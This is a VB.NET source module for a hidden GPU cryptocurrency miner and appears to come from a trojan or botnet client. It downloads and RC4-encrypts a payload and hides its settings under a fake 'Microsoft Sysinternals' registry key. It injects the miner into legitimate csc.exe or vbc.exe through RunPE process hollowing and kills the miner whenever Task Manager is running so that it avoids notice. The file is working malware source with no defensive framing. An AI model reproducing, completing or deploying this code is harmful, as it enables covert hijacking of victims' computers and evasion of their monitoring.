Imports System.IO
Imports System.IO.Compression
Module GPUMiner
    Public Balls As String = "ShowSuperHidden"
    Dim RanGPUMiner As Boolean = False
    Dim GPUMinerFile = InstallationOfEverything & "G" & Main.Mutex
    Public GPUMinerExecutable As String = "eAtShiTAnDDiE.exe"
    Public Sub GPUMinerThreader()
        Try
           
                If RanGPUMiner = True Then
                    Try
                        If (Process.GetProcessesByName("taskmgr").Length >= 1) Then
                            For Each Process In GetObject("winmgmts:").ExecQuery("Select Name from Win32_Process Where Name = '" & GPUMinerExecutable & ".exe" & "'")
                                Process.Terminate()
                            Next
                            Threading.Thread.Sleep(10000)
                        Else

                            If (Process.GetProcessesByName(GPUMinerExecutable).Length >= 1) Then

                            Else
                                RanGPUMiner = False
                                BeginGPUMiner()
                            End If
                        End If

                    Catch : End Try
                End If
        Catch : End Try

    End Sub
    Public Sub BeginGPUMiner()
        Try
            If RanGPUMiner = False Then
                Dim TopLels = GetSetting("Microsoft", "Sysinternals", "vir32")
                If Not TopLels = String.Empty Then
                    Dim sCommand = TopLels

                    If IO.File.Exists(GPUMinerFile) Then '
                        AllowAccess(GPUMinerFile)
                        Dim MinerFile = My.Computer.FileSystem.ReadAllBytes(GPUMinerFile)
                        Dim reversed = Proper_RC4(MinerFile, System.Text.Encoding.UTF8.GetBytes(Main.Mutex))
                        Array.Reverse(reversed, 0, reversed.Length)
                        If mRunpe.InjectPE(reversed, System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory & "csc.exe", sCommand) Then
                            RanGPUMiner = True
                            GPUMinerExecutable = "csc"
                        ElseIf mRunpe.InjectPE(reversed, System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory & "vbc.exe", sCommand) Then
                            RanGPUMiner = True
                            GPUMinerExecutable = "vbc"
                        End If

                    End If
                End If

            Else


            End If

        Catch : End Try
    End Sub
    Public Sub InstallGPUMiner(ByVal FileDownload As String, ByVal Arguments As String)
        Try
            If Not IO.File.Exists(GPUMinerFile) Then
                Dim wget As New System.Net.WebClient
                Dim b = wget.DownloadData(FileDownload)
                Dim e = Proper_RC4(b, System.Text.Encoding.UTF8.GetBytes(Main.Mutex))
                IO.File.WriteAllBytes(GPUMinerFile, e)
            End If

            Call SaveSetting("Microsoft", "Sysinternals", "vir32", Arguments)
            BeginGPUMiner()
        Catch
        End Try
    End Sub
    Public Sub RemoveGPUMiner()
        On Error Resume Next
        Dim TopLels = GetSetting("Microsoft", "Sysinternals", "vir32")
        If Not TopLels = String.Empty Then
            If IO.File.Exists(GPUMinerFile) Then
                AllowAccess(InstallationOfEverything)
                AllowAccess(GPUMinerFile)
                IO.File.Delete(GPUMinerFile)
            End If
            Call SaveSetting("Microsoft", "Sysinternals", "vir32", String.Empty)
            Dim Process As Object
            For Each Process In GetObject("winmgmts:").ExecQuery("Select Name from Win32_Process Where Name = '" & GPUMinerExecutable & ".exe" & "'")
                Process.Terminate()
            Next
            RanGPUMiner = False
        End If
    End Sub
End Module
